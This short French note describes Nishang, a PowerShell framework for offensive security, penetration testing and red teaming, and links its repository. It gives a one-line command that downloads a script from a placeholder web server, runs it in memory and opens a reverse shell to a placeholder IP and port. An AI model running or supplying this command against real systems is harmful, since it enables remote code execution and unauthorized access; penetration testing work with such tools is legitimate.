 Nishang est un framework et un ensemble de scripts et de charges utiles permettant d'utiliser PowerShell pour la sécurité offensive, les tests d'intrusion et le red teaming. Nishang est utile à toutes les phases des tests d'intrusion.
 
```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

https://github.com/samratashok/nishang